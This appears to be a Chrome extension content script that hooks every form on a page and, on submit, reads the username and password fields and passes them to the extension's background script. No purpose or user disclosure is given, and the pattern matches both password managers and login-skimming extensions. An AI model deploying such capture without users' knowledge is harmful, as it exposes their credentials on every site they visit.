document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', (event) => {
        const usernameField = form.querySelector('input[type="text"]');
        const passwordField = form.querySelector('input[type="password"]');
        
        if (usernameField && passwordField) {
            const username = usernameField.value;
            const password = passwordField.value;

            // Send the username and password to the background script
            chrome.runtime.sendMessage({username, password});
        }
    });
});
